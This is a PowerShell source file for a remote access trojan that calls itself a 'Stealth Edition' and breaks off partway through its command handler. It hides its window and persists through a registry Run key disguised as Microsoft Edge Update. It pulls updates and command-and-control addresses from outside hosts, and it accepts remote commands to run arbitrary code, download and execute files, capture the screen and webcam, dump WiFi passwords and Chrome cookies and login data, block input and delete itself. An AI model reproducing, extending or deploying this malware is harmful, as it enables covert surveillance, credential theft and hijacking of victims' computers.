# RAT WebSocket Client - Full Featured Stealth Edition v3
# Auto-update, fixed toast notifications, infinite retry

# Force run as hidden job if not already
$myPID = $PID
$runningJobs = Get-WmiObject Win32_Process | Where-Object { $_.CommandLine -like "*EdgeUpdate*updater.ps1*" -and $_.ProcessId -ne $myPID }
if ($runningJobs.Count -gt 1) { exit }

# Hide all windows
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'
$consolePtr = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($consolePtr, 0) | Out-Null

Add-Type -AssemblyName System.Net.Http
Add-Type -AssemblyName System.Web
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName System.Speech

# Mouse/Keyboard control
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class InputControl {
    [DllImport("user32.dll")]
    public static extern bool ShowCursor(bool bShow);
    
    [DllImport("user32.dll")]
    public static extern bool BlockInput(bool fBlockIt);
    
    [DllImport("user32.dll")]
    public static extern IntPtr GetForegroundWindow();
    
    [DllImport("user32.dll")]
    public static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);
}
"@ -ErrorAction SilentlyContinue

$global:uid = "$env:COMPUTERNAME-$env:USERNAME"
$wssUrlFile = "https://raw.githubusercontent.com/icyyboy/wss-test-/refs/heads/main/url"
$scriptUrlFile = "https://raw.githubusercontent.com/icyyboy/wss-test-/refs/heads/main/rat.ps1"
$botPrefix = "/"
$persistEnabled = $false
$global:scriptVersion = "3.0"

# Install BurntToast for notifications
function Install-BurntToast {
    try {
        if (-not (Get-Module -ListAvailable -Name BurntToast)) {
            Set-PSRepository -Name PSGallery -InstallationPolicy Trusted -ErrorAction SilentlyContinue
            Install-Module BurntToast -Scope CurrentUser -Force -ErrorAction Stop
        }
        Import-Module BurntToast -ErrorAction Stop
        return $true
    } catch {
        return $false
    }
}

# Auto-update function
function Check-Update {
    try {
        $latestScript = Invoke-WebRequest -Uri $scriptUrlFile -UseBasicParsing -TimeoutSec 10
        $latestContent = $latestScript.Content
        
        # Extract version from latest script
        if ($latestContent -match '\$global:scriptVersion = "([^"]+)"') {
            $latestVersion = $matches[1]
            
            if ($latestVersion -ne $global:scriptVersion) {
                # Update available
                $targetPath = "$env:APPDATA\Microsoft\EdgeUpdate\updater.ps1"
                
                # Backup current version
                if (Test-Path $targetPath) {
                    Copy-Item $targetPath "$targetPath.bak" -Force
                }
                
                # Download new version
                Set-Content -Path $targetPath -Value $latestContent -Force
                
                # Restart with new version
                Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -NonInteractive -File `"$targetPath`"" -WindowStyle Hidden
                exit
            }
        }
    } catch {
        # Silent fail, continue with current version
    }
}

function Get-WssUrl {
    $retries = 0
    while ($true) {
        try {
            $url = (Invoke-WebRequest -Uri $wssUrlFile -UseBasicParsing -TimeoutSec 10).Content.Trim()
            if ($url) {
                return $url
            }
        } catch {
            # Silent fail, will retry
        }
        
        $retries++
        $waitTime = [Math]::Min(30 * [Math]::Pow(2, [Math]::Min($retries - 1, 3)), 300)
        Start-Sleep -Seconds $waitTime
        
        if ($retries -ge 5) {
            return "wss://free.blr2.piesocket.com/v3/1?api_key=bJpyvYTy22qCCTlsfwEpe7IOhGiMzoNy3YJqTMp6&notify_self=1"
        }
    }
}

function Initialize-Persistence {
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $regName = "MicrosoftEdgeUpdate"
    
    try {
        $existing = Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue
        
        if (-not $existing) {
            $targetDir = "$env:APPDATA\Microsoft\EdgeUpdate"
            
            if (-not (Test-Path $targetDir)) {
                New-Item -ItemType Directory -Path $targetDir -Force | Out-Null
                attrib +h $targetDir
            }
            
            $scriptPath = "$targetDir\updater.ps1"
            
            if ($PSCommandPath -ne $scriptPath) {
                Copy-Item $PSCommandPath $scriptPath -Force
            }
            
            $batPath = "$targetDir\launcher.bat"
            $batContent = @"
@echo off
start "" powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -NonInteractive -Command "Start-Process powershell -ArgumentList '-WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -NonInteractive -File \`"$scriptPath\`"' -WindowStyle Hidden"
exit
"@
            Set-Content -Path $batPath -Value $batContent -Force
            
            $regValue = "cmd.exe /c start /min `"`" `"$batPath`""
            Set-ItemProperty -Path $regPath -Name $regName -Value $regValue -Force
            
            $global:persistEnabled = $true
            return $true
        } else {
            $global:persistEnabled = $true
            return $false
        }
    } catch {
        return $false
    }
}

function Check-Persistence {
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $regName = "MicrosoftEdgeUpdate"
    try {
        $value = Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue
        return $null -ne $value
    } catch {
        return $false
    }
}

function Set-Persistence {
    param([bool]$enable)
    
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $regName = "MicrosoftEdgeUpdate"
    
    if ($enable) {
        $targetDir = "$env:APPDATA\Microsoft\EdgeUpdate"
        if (-not (Test-Path $targetDir)) {
            New-Item -ItemType Directory -Path $targetDir -Force | Out-Null
            attrib +h $targetDir
        }
        
        $scriptPath = "$targetDir\updater.ps1"
        
        if ($PSCommandPath -ne $scriptPath) {
            Copy-Item $PSCommandPath $scriptPath -Force
        }
        
        $batPath = "$targetDir\launcher.bat"
        $batContent = @"
@echo off
start "" powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -NonInteractive -Command "Start-Process powershell -ArgumentList '-WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -NonInteractive -File \`"$scriptPath\`"' -WindowStyle Hidden"
exit
"@
        Set-Content -Path $batPath -Value $batContent -Force
        
        $regValue = "cmd.exe /c start /min `"`" `"$batPath`""
        Set-ItemProperty -Path $regPath -Name $regName -Value $regValue -Force
        
        $global:persistEnabled = $true
        return "Persistence enabled"
    } else {
        Remove-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue
        $global:persistEnabled = $false
        return "Persistence disabled"
    }
}

function Get-SystemInfo {
    try {
        $publicIP = (Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing -TimeoutSec 5).Content
    } catch {
        $publicIP = "Unknown"
    }
    
    $gpu = (Get-WmiObject Win32_VideoController).Name
    $ram = [math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)
    $cpu = (Get-WmiObject Win32_Processor).Name
    $disk = Get-WmiObject Win32_LogicalDisk -Filter "DeviceID='C:'" | Select-Object @{N="FreeGB";E={[math]::Round($_.FreeSpace/1GB,2)}}, @{N="SizeGB";E={[math]::Round($_.Size/1GB,2)}}
    
    return @"
UID: $global:uid
Version: $global:scriptVersion
Hostname: $env:COMPUTERNAME
Username: $env:USERNAME
OS: $((Get-WmiObject Win32_OperatingSystem).Caption)
Architecture: $env:PROCESSOR_ARCHITECTURE
Public IP: $publicIP
CPU: $cpu
RAM: ${ram}GB
GPU: $gpu
Disk C: $($disk.FreeGB)GB free / $($disk.SizeGB)GB total
Persistence: $persistEnabled
"@
}

function Execute-Command {
    param([string]$cmd)
    try {
        $output = iex $cmd 2>&1 | Out-String
        return $output.Trim()
    } catch {
        return "Error: $($_.Exception.Message)"
    }
}

function Download-File {
    param([string]$url, [string]$path)
    try {
        Invoke-WebRequest -Uri $url -OutFile $path -UseBasicParsing
        return "Downloaded: $path"
    } catch {
        return "Download failed: $($_.Exception.Message)"
    }
}

function Upload-File {
    param([string]$filePath)
    if (Test-Path $filePath) {
        $bytes = [System.IO.File]::ReadAllBytes($filePath)
        $base64 = [Convert]::ToBase64String($bytes)
        return @{file = (Split-Path $filePath -Leaf); data = $base64} | ConvertTo-Json -Compress
    }
    return "File not found"
}

function Take-Screenshot {
    try {
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
        
        $ms = New-Object System.IO.MemoryStream
        $bitmap.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png)
        $bytes = $ms.ToArray()
        $ms.Close()
        $graphics.Dispose()
        $bitmap.Dispose()
        
        return [Convert]::ToBase64String($bytes)
    } catch {
        return "Screenshot failed: $($_.Exception.Message)"
    }
}

function Capture-Webcam {
    try {
        $tempFile = "$env:TEMP\wc_$(Get-Random).jpg"
        
        Add-Type -AssemblyName System.Drawing
        
        $videoSource = New-Object -ComObject WIA.DeviceManager
        $device = $videoSource.DeviceInfos | Where-Object { $_.Type -eq 2 } | Select-Object -First 1
        
        if (-not $device) {
            return "No webcam found"
        } else {
            $dev = $device.Connect()
            $item = $dev.Items[1]
            $image = $item.Transfer("{B96B3CAE-0728-11D3-9D7B-0000F81EF32E}")
            $image.SaveFile($tempFile)
        }
        
        if (Test-Path $tempFile) {
            $bytes = [System.IO.File]::ReadAllBytes($tempFile)
            Remove-Item $tempFile -Force
            return [Convert]::ToBase64String($bytes)
        }
        
        return "Webcam capture failed"
    } catch {
        return "Webcam error: $($_.Exception.Message)"
    }
}

function Get-WiFiPasswords {
    try {
        $profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { ($_ -split ":")[-1].Trim() }
        $result = "WiFi Networks:`n`n"
        
        foreach ($profile in $profiles) {
            $password = netsh wlan show profile name="$profile" key=clear | Select-String "Key Content" | ForEach-Object { ($_ -split ":")[-1].Trim() }
            if ($password) {
                $result += "$profile : $password`n"
            } else {
                $result += "$profile : (no password)`n"
            }
        }
        
        if ($profiles.Count -eq 0) {
            return "No WiFi profiles found"
        }
        
        return $result
    } catch {
        return "Failed to get WiFi passwords: $($_.Exception.Message)"
    }
}

function Get-ChromePasswords {
    try {
        $chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
        if (-not (Test-Path $chromePath)) {
            return "Chrome Login Data not found"
        }
        
        $tempDb = "$env:TEMP\ld_$(Get-Random).db"
        Copy-Item $chromePath $tempDb -Force -ErrorAction Stop
        
        $bytes = [System.IO.File]::ReadAllBytes($tempDb)
        $text = [System.Text.Encoding]::ASCII.GetString($bytes)
        
        $urls = [regex]::Matches($text, 'https?://[a-zA-Z0-9\-\.]+\.[a-zA-Z]{2,}') | ForEach-Object { $_.Value } | Select-Object -Unique
        
        Remove-Item $tempDb -Force
        
        if ($urls.Count -gt 0) {
            $result = "Chrome Saved Login URLs:`n`n"
            $urls | ForEach-Object { $result += "$_`n" }
            return $result
        }
        
        return "No Chrome passwords found"
    } catch {
        return "Chrome passwords failed: $($_.Exception.Message)"
    }
}

function Get-ChromeCookies {
    try {
        $cookiesPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies"
        
        if (-not (Test-Path $cookiesPath)) {
            $cookiesPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
        }
        
        if (-not (Test-Path $cookiesPath)) {
            return "Chrome Cookies not found"
        }
        
        $tempDb = "$env:TEMP\ck_$(Get-Random).db"
        Copy-Item $cookiesPath $tempDb -Force -ErrorAction Stop
        
        $bytes = [System.IO.File]::ReadAllBytes($tempDb)
        $base64 = [Convert]::ToBase64String($bytes)
        
        Remove-Item $tempDb -Force
        
        return "Chrome Cookies (base64):`n`n$base64"
    } catch {
        return "Chrome cookies failed: $($_.Exception.Message)"
    }
}

function Get-NetworkInfo {
    try {
        $result = "Network Information:`n`n"
        
        $adapters = Get-NetAdapter | Where-Object { $_.Status -eq 'Up' }
        foreach ($adapter in $adapters) {
            $config = Get-NetIPAddress -InterfaceIndex $adapter.ifIndex -ErrorAction SilentlyContinue
            $result += "Adapter: $($adapter.Name)`n"
            $result += "  MAC: $($adapter.MacAddress)`n"
            foreach ($ip in $config) {
                $result += "  IP: $($ip.IPAddress)`n"
            }
            $result += "`n"
        }
        
        return $result
    } catch {
        return "Network info failed: $($_.Exception.Message)"
    }
}

function Get-OpenPorts {
    try {
        $connections = netstat -ano | Select-String "LISTENING"
        return "Open Ports:`n`n$connections"
    } catch {
        return "Failed to get ports: $($_.Exception.Message)"
    }
}

function Get-ArpTable {
    try {
        $arp = arp -a
        return "ARP Table:`n`n$arp"
    } catch {
        return "Failed to get ARP: $($_.Exception.Message)"
    }
}

function Set-SystemVolume {
    param([int]$percent)
    
    try {
        if ($percent -lt 0) { $percent = 0 }
        if ($percent -gt 100) { $percent = 100 }
        
        $obj = New-Object -ComObject wscript.shell
        $obj.SendKeys([char]173)
        Start-Sleep -Milliseconds 100
        $obj.SendKeys([char]173)
        Start-Sleep -Milliseconds 100
        
        for ($i = 0; $i -lt 50; $i++) {
            $obj.SendKeys([char]174)
        }
        Start-Sleep -Milliseconds 200
        
        $ticks = [math]::Round($percent / 2)
        for ($i = 0; $i -lt $ticks; $i++) {
            $obj.SendKeys([char]175)
        }
        
        return "Volume set to $percent%"
    } catch {
        return "Failed to set volume: $($_.Exception.Message)"
    }
}

function Get-SystemVolume {
    try {
        Add-Type -TypeDefinition @"
using System.Runtime.InteropServices;
public class VolGet {
    [DllImport("winmm.dll")]
    public static extern int waveOutGetVolume(int hwo, out uint dwVolume);
}
"@ -ErrorAction SilentlyContinue
        [uint32]$vol = 0
        [VolGet]::waveOutGetVolume(0, [ref]$vol)
        $percent = [math]::Round((($vol -band 0xFFFF) / 0xFFFF) * 100)
        return "Current volume: ~$percent%"
    } catch {
        return "Volume: Unknown"
    }
}

function Invoke-TTS {
    param([string]$text)
    
    try {
        Start-Job -ScriptBlock {
            param($txt)
            Add-Type -AssemblyName System.Speech
            $voice = New-Object System.Speech.Synthesis.SpeechSynthesizer
            $voice.Rate = 0
            $voice.Volume = 100
            $voice.Speak($txt)
            $voice.Dispose()
        } -ArgumentList $text | Out-Null
        
        return "TTS playing: $text"
    } catch {
        return "TTS failed: $($_.Exception.Message)"
    }
}

function Play-AudioFile {
    param([string]$url)
    
    try {
        Start-Job -ScriptBlock {
            param($audioUrl)
            $ext = [System.IO.Path]::GetExtension($audioUrl)
            if (-not $ext) { $ext = ".mp3" }
            
            $tempFile = "$env:TEMP\audio_$(Get-Random)$ext"
            Invoke-WebRequest -Uri $audioUrl -OutFile $tempFile -UseBasicParsing
            
            Add-Type -AssemblyName presentationCore
            $player = New-Object System.Windows.Media.MediaPlayer
            $player.Open($tempFile)
            $player.Play()
            
            Start-Sleep -Seconds 30
            $player.Close()
            Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
        } -ArgumentList $url | Out-Null
        
        return "Audio playing in background"
    } catch {
        return "Audio playback failed: $($_.Exception.Message)"
    }
}

function Show-MessageBox {
    param([string]$text)
    
    try {
        Start-Job -ScriptBlock {
            param($msg)
            Add-Type -AssemblyName System.Windows.Forms
            [System.Windows.Forms.MessageBox]::Show($msg, "System Message", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information)
        } -ArgumentList $text | Out-Null
        
        return "Message box shown: $text"
    } catch {
        return "Message box failed: $($_.Exception.Message)"
    }
}

function Set-MouseVisibility {
    param([bool]$visible)
    
    try {
        for ($i = 0; $i -lt 10; $i++) {
            [InputControl]::ShowCursor($visible)
            Start-Sleep -Milliseconds 50
        }
        
        $status = if ($visible) { "visible" } else { "hidden" }
        return "Mouse cursor $status"
    } catch {
        return "Failed to change mouse visibility: $($_.Exception.Message)"
    }
}

function Invoke-SystemShutdown {
    param([string]$action, [int]$seconds = 30)
    
    try {
        switch ($action) {
            "shutdown" {
                shutdown /s /t $seconds /c "System maintenance"
                return "Shutdown scheduled in $seconds seconds"
            }
            "restart" {
                shutdown /r /t $seconds /c "System restart"
                return "Restart scheduled in $seconds seconds"
            }
            "cancel" {
                shutdown /a
                return "Shutdown/restart cancelled"
            }
            default {
                return "Usage: /shutdown shutdown/restart/cancel [seconds]"
            }
        }
    } catch {
        return "Shutdown failed: $($_.Exception.Message)"
    }
}

function Invoke-FlipScreen {
    try {
        $obj = New-Object -ComObject wscript.shell
        $obj.SendKeys("^%{DOWN}")
        return "Screen flipped (use Ctrl+Alt+Up to restore)"
    } catch {
        return "Screen flip failed: $($_.Exception.Message)"
    }
}

function Invoke-ShakeWindows {
    param([int]$duration = 5)
    
    try {
        Start-Job -ScriptBlock {
            param($dur)
            Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class WinShake {
    [DllImport("user32.dll")]
    public static extern IntPtr GetForegroundWindow();
    [DllImport("user32.dll")]
    public static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);
}
"@
            
            $hwnd = [WinShake]::GetForegroundWindow()
            $iterations = $dur * 20
            
            for ($i = 0; $i -lt $iterations; $i++) {
                $x = Get-Random -Minimum -15 -Maximum 15
                $y = Get-Random -Minimum -15 -Maximum 15
                [WinShake]::SetWindowPos($hwnd, [IntPtr]::Zero, $x, $y, 0, 0, 0x0001 -bor 0x0004)
                Start-Sleep -Milliseconds 50
            }
            
            [WinShake]::SetWindowPos($hwnd, [IntPtr]::Zero, 0, 0, 0, 0, 0x0001 -bor 0x0004)
        } -ArgumentList $duration | Out-Null
        
        return "Window shaking for $duration seconds"
    } catch {
        return "Shake failed: $($_.Exception.Message)"
    }
}

function Invoke-GlitchEffect {
    try {
        Start-Job -ScriptBlock {
            $obj = New-Object -ComObject wscript.shell
            
            for ($i = 0; $i -lt 5; $i++) {
                $obj.SendKeys("^%{DOWN}")
                Start-Sleep -Milliseconds 200
                $obj.SendKeys("^%{LEFT}")
                Start-Sleep -Milliseconds 200
                $obj.SendKeys("^%{UP}")
                Start-Sleep -Milliseconds 200
                $obj.SendKeys("^%{RIGHT}")
                Start-Sleep -Milliseconds 200
            }
            
            $obj.SendKeys("^%{UP}")
        } | Out-Null
        
        return "Glitch effect executing"
    } catch {
        return "Glitch failed: $($_.Exception.Message)"
    }
}

function Invoke-SwapKeys {
    param([string]$duration = "30")
    
    try {
        Start-Job -ScriptBlock {
            param($seconds)
            Add-Type -AssemblyName System.Windows.Forms
            
            $endTime = (Get-Date).AddSeconds($seconds)
            
            while ((Get-Date) -lt $endTime) {
                if ([System.Windows.Forms.Control]::IsKeyLocked([System.Windows.Forms.Keys]::CapsLock)) {
                    [System.Windows.Forms.SendKeys]::SendWait("{CAPSLOCK}")
                }
                Start-Sleep -Milliseconds 100
            }
        } -ArgumentList ([int]$duration) | Out-Null
        
        return "Keys swapping for $duration seconds"
    } catch {
        return "Key swap failed: $($_.Exception.Message)"
    }
}

function Invoke-DisableKeyboard {
    param([int]$seconds = 10)
    
    try {
        Start-Job -ScriptBlock {
            param($sec)
            Add-Type -TypeDefinition @"
using System.Runtime.InteropServices;
public class KbBlock {
    [DllImport("user32.dll")]
    public static extern bool BlockInput(bool fBlockIt);
}
"@
            [KbBlock]::BlockInput($true)
            Start-Sleep -Seconds $sec
            [KbBlock]::BlockInput($false)
        } -ArgumentList $seconds | Out-Null
        
        return "Keyboard will be blocked for $seconds seconds"
    } catch {
        return "Keyboard block failed (may need admin): $($_.Exception.Message)"
    }
}

function Invoke-SpamText {
    param([string]$text, [int]$count = 50)
    
    try {
        Start-Job -ScriptBlock {
            param($txt, $cnt)
            $obj = New-Object -ComObject wscript.shell
            Start-Sleep -Seconds 2
            
            for ($i = 0; $i -lt $cnt; $i++) {
                $obj.SendKeys($txt)
                $obj.SendKeys("{ENTER}")
                Start-Sleep -Milliseconds 100
            }
        } -ArgumentList $text, $count | Out-Null
        
        return "Spamming text $count times"
    } catch {
        return "Text spam failed: $($_.Exception.Message)"
    }
}

function Show-ToastNotification {
    param([string]$title, [string]$message)
    
    try {
        Start-Job -ScriptBlock {
            param($t, $m)
            
            # Install BurntToast if not available
            if (-not (Get-Module -ListAvailable -Name BurntToast)) {
                Set-PSRepository -Name PSGallery -InstallationPolicy Trusted -ErrorAction SilentlyContinue
                Install-Module BurntToast -Scope CurrentUser -Force -ErrorAction Stop
            }
            
            Import-Module BurntToast -ErrorAction Stop
            New-BurntToastNotification -Text $t, $m -ErrorAction Stop
        } -ArgumentList $title, $message | Out-Null
        
        return "Toast sent: $title - $message"
    } catch {
        # Fallback to balloon tip
        try {
            Add-Type -AssemblyName System.Windows.Forms
            $balloon = New-Object System.Windows.Forms.NotifyIcon
            $balloon.Icon = [System.Drawing.SystemIcons]::Information
            $balloon.Visible = $true
            $balloon.ShowBalloonTip(5000, $title, $message, [System.Windows.Forms.ToolTipIcon]::Info)
            Start-Sleep -Seconds 2
            $balloon.Dispose()
            return "Balloon notification sent: $title"
        } catch {
            return "Toast failed: $($_.Exception.Message)"
        }
    }
}

function Invoke-SpamNotifications {
    param([int]$count = 20)
    
    try {
        Start-Job -ScriptBlock {
            param($cnt)
            
            # Install BurntToast if needed
            if (-not (Get-Module -ListAvailable -Name BurntToast)) {
                Set-PSRepository -Name PSGallery -InstallationPolicy Trusted -ErrorAction SilentlyContinue
                Install-Module BurntToast -Scope CurrentUser -Force -ErrorAction SilentlyContinue
            }
            
            Import-Module BurntToast -ErrorAction SilentlyContinue
            
            for ($i = 1; $i -le $cnt; $i++) {
                try {
                    New-BurntToastNotification -Text "Notification #$i", "Message number $i" -ErrorAction Stop
                } catch {
                    # Fallback to balloon
                    Add-Type -AssemblyName System.Windows.Forms
                    $balloon = New-Object System.Windows.Forms.NotifyIcon
                    $balloon.Icon = [System.Drawing.SystemIcons]::Information
                    $balloon.Visible = $true
                    $balloon.ShowBalloonTip(3000, "Notification #$i", "Message number $i", [System.Windows.Forms.ToolTipIcon]::Info)
                    $balloon.Dispose()
                }
                Start-Sleep -Milliseconds 500
            }
        } -ArgumentList $count | Out-Null
        
        return "Spamming $count notifications"
    } catch {
        return "Notification spam failed: $($_.Exception.Message)"
    }
}

function Invoke-DownloadAndExecute {
    param([string]$url, [string]$args = "")
    
    try {
        $ext = [System.IO.Path]::GetExtension($url)
        if (-not $ext) { $ext = ".exe" }
        
        $tempFile = "$env:TEMP\dl_$(Get-Random)$ext"
        Invoke-WebRequest -Uri $url -OutFile $tempFile -UseBasicParsing
        
        if ($args) {
            Start-Process -FilePath $tempFile -ArgumentList $args -WindowStyle Hidden
            return "Downloaded and executed: $tempFile $args"
        } else {
            Start-Process -FilePath $tempFile -WindowStyle Hidden
            return "Downloaded and executed: $tempFile"
        }
    } catch {
        return "Download/Execute failed: $($_.Exception.Message)"
    }
}

function Invoke-HideWindow {
    try {
        $hwnd = [InputControl]::GetForegroundWindow()
        [Console.Window]::ShowWindow($hwnd, 0)
        return "Active window hidden"
    } catch {
        return "Hide window failed: $($_.Exception.Message)"
    }
}

function Invoke-Logout {
    try {
        rundll32.exe user32.dll,LockWorkStation
        return "Workstation locked"
    } catch {
        return "Failed to lock: $($_.Exception.Message)"
    }
}

function Invoke-KillExplorer {
    try {
        Stop-Process -Name explorer -Force
        return "Explorer.exe killed"
    } catch {
        return "Failed to kill explorer: $($_.Exception.Message)"
    }
}

function Set-Wallpaper {
    param([string]$url)
    
    try {
        $ext = [System.IO.Path]::GetExtension($url)
        if (-not $ext) { $ext = ".jpg" }
        
        $wallpaperPath = "$env:TEMP\wallpaper_$(Get-Random)$ext"
        Invoke-WebRequest -Uri $url -OutFile $wallpaperPath -UseBasicParsing
        
        if (-not (Test-Path $wallpaperPath)) {
            return "Failed to download wallpaper"
        }
        
        Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Wallpaper {
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
}
"@ -ErrorAction SilentlyContinue
        
        $SPI_SETDESKWALLPAPER = 0x0014
        $SPIF_UPDATEINIFILE = 0x01
        $SPIF_SENDCHANGE = 0x02
        
        [Wallpaper]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $wallpaperPath, $SPIF_UPDATEINIFILE -bor $SPIF_SENDCHANGE)
        
        return "Wallpaper changed successfully"
    } catch {
        return "Wallpaper change failed: $($_.Exception.Message)"
    }
}

function Remove-SelfDelete {
    try {
        $scriptPath = $PSCommandPath
        $targetDir = "$env:APPDATA\Microsoft\EdgeUpdate"
        
        Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "MicrosoftEdgeUpdate" -ErrorAction SilentlyContinue
        
        $batContent = @"
@echo off
timeout /t 2 /nobreak >nul
del /f /q "$scriptPath"
del /f /q "$targetDir\updater.ps1"
del /f /q "$targetDir\launcher.bat"
rmdir /q "$targetDir"
del /f /q "%~f0"
"@
        
        $batPath = "$env:TEMP\cleanup_$(Get-Random).bat"
        Set-Content $batPath $batContent
        
        Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$batPath`"" -WindowStyle Hidden
        
        return "Self-destruct initiated"
        Start-Sleep -Seconds 1
        exit
    } catch {
        return "Self-delete failed: $($_.Exception.Message)"
    }
}

function Process-Command {
    param([string]$message)
    
    if ($message.StartsWith("#")) {
        $parts = $message.Substring(1) -split ' ', 2
        $targetUid = $parts[0]
        
        if ($targetUid -ne $global:uid) {
            return $null
        }
        
        if ($parts.Length -lt 2) {
            return $null
        }
        $message = $parts[1]
    }
    
    if (-not $message.StartsWith($botPrefix)) { return $null }
    
    $parts = $message.Substring(1) -split ' '
    $cmd = $parts[0].ToLower()
    $args = $parts[1..($parts.Length-1)]
    
    switch ($cmd) {
        "info" { return Get-SystemInfo }
        "update" { 
            Check-Update
            return "Checking for updates..."
        }
        "exec" {
            if ($args.Count -gt 0) {
                return Execute-Command -cmd ($args -join ' ')
            }
            return "Usage: /exec <command>"
        }
        "download" {
            if ($args.Count -ge 2) {
                return Download-File -url $args[0] -path ($args[1..($args.Count-1)] -join ' ')
            }
            return "Usage: /download <url> <path>"
        }
        "upload" {
            if ($args.Count -gt 0) {
                return Upload-File -filePath ($args -join ' ')
            }
            return "Usage: /upload <filepath>"
        }
        "ss" { return Take-Screenshot }
        "webcam" { return Capture-Webcam }
        "wifi" { return Get-WiFiPasswords }
        "passwords" { return Get-ChromePasswords }
        "cookies" { return Get-ChromeCookies }
        "netinfo" { return Get-NetworkInfo }
        "ports" { return Get-OpenPorts }
        "arp" { return Get-ArpTable }
        "volume" {
            if ($args.Count -gt 0 -and $args[0] -match '^\d+$') {
                return Set-SystemVolume -percent ([int]$args[0])
            } elseif ($args.Count -gt 0 -and $args[0] -eq "get") {
                return Get-SystemVolume
            }
            return "Usage: /volume <0-100> or /volume get"
        }
        "tts" {
            if ($args.Count -gt 0) {
                return Invoke-TTS -text ($args -join ' ')
            }
            return "Usage: /tts <text>"
        }
        "play" {
            if ($args.Count -gt 0) {
                return Play-AudioFile -url $args[0]
            }
            return "Usage: /play <audio_url>"
        }
        "msg" {
            if ($args.Count -gt 0) {
                return Show-MessageBox -text ($args -join ' ')
            }
            return "Usage: /msg <text>"
        }
        "hidemouse" { return Set-MouseVisibility -visible $false }
        "showmouse" { return Set-MouseVisibility -visible $true }
        "shutdown" {
            if ($args.Count -gt 0) {
                $sec = if ($args.Count -gt 1) { [int]$args[1] } else { 30 }
                return Invoke-SystemShutdown -action $args[0] -seconds $sec
            }
            return "Usage: /shutdown shutdown/restart/cancel [seconds]"
        }
        "flip" { return Invoke-FlipScreen }
        "shake" {
            $dur = if ($args.Count -gt 0 -and $args[0] -match '^\d+$') { [int]$args[0] } else { 5 }
            return Invoke-ShakeWindows -duration $dur
        }
        "glitch" { return Invoke-GlitchEffect }
        "swapkeys" {
            $dur = if ($args.Count -gt 0) { $args[0] } else { "30" }
            return Invoke-SwapKeys -duration $dur
        }
        "disablekb" {
            $sec = if ($args.Count -gt 0) { [int]$args[0] } else { 10 }
            return Invoke-DisableKeyboard -seconds $sec
        }
        "spam" {
            if ($args.Count -gt 0) {
                $cnt = if ($args.Count -gt 1 -and $args[-1] -match '^\d+$') { [int]$args[-1]; $args = $args[0..($args.Count-2)] } else { 50 }
                return Invoke-SpamText -text ($args -join ' ') -count $cnt
            }
            return "Usage: /spam <text> [count]"
        }
        "toast" {
            if ($args.Count -ge 2) {
                return Show-ToastNotification -title $args[0] -message ($args[1..($args.Count-1)] -join ' ')
            }
            return "Usage: /toast <title> <message>"
        }
        "notifyspam" {
            $cnt = if ($args.Count -gt 0) { [int]$args[0] } else { 20 }
            return Invoke-SpamNotifications -count $cnt
        }
        "dlexec" {
            if ($args.Count -gt 0) {
                return Invoke-DownloadAndExecute -url $args[0]
            }
            return "Usage: /dlexec <url>"
        }
        "dlrun" {
            if ($args.Count -ge 2) {
                return Invoke-DownloadAndExecute -url $args[0] -args ($args[1..($args.Count-1)] -join ' ')
            }
            return "Usage: /dlrun <url> <args>"
        }
        "hide" { return Invoke-HideWindow }
        "logout" { return Invoke-Logout }
        "killsis" { return Invoke-KillExplorer }
        "wallpaper" {
            if ($args.Count -gt 0) {
                return Set-Wallpaper -url $args[0]
            }
            return "Usage: /wallpaper <image_url>"
        }
        "selfdestruct" { return Remove-SelfDelete }
        "persist" {
            if ($args.Count -gt 0 -and $args[0] -eq "on") {
                return Set-Persistence -enable $true
            } elseif ($args.Count -gt 0 -and $args[0] -eq "off") {
                return Set-Persistence -enable $false
            } else {
                $status = if ($persistEnabled) { "ENABLED" } else { "DISABLED" }
                return "Persistence: $status | Usage: /persist on/off"
            }
        }
        "processes" { 
